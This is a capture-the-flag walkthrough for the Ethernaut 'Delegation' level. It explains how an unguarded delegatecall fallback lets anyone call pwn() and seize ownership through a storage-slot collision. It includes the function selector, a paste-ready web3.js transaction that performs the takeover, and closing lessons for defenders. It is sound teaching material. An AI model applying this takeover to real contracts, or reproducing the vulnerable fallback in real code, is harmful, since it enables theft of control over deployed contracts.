# Level 6: Delegation

## Challenge Overview

The `Delegation` challenge highlights the dangers of using `delegatecall` with untrusted contracts.  
The goal is to gain ownership of the `Delegation` contract by exploiting a vulnerable `delegatecall`.

## Goal

- Execute the `pwn()` function in the `Delegate` contract through `delegatecall` to take ownership.

## Solution

1. Both contracts declare their first variable as `owner` at storage slot 0.  
   When `Delegate.pwn()` executes via `delegatecall`, it writes to the caller’s slot 0 —  
   i.e. the `Delegation` contract’s `owner`.

2. Any calldata sent to `Delegation` that doesn’t match a defined function hits this fallback,  
   forwarding the exact bytes (`msg.data`) to `Delegate` via `delegatecall`:

```solidity
fallback() external {
    (bool ok, ) = address(delegate).delegatecall(msg.data);
    require(ok);
}
```

3. Find the function selector for `pwn()`:
```text
0xdd365b8b
```

4. Invoke the fallback via web3.js.  
You can paste this into the Ethernaut browser console:

```javascript
// 2.1) Store the selector
const selector = "0xdd365b8b";

// 2.2) Send it to the fallback
await sendTransaction({
  from: player,            // your EOA address
  to: contract.address,    // Delegation’s address
  data: selector           // invokes Delegate.pwn() via delegatecall
});

// 2.3) Verify ownership
console.log("new owner:", await contract.owner());
// Should print your player address
```

5. After running the transaction, check that:

```javascript
(await contract.owner()) === player
```

---

## Lessons Learned

- Using `delegatecall` without strict ABI control can let external code overwrite your contract’s state slots.
- Never allow raw `msg.data` to determine which functions run via `delegatecall`.
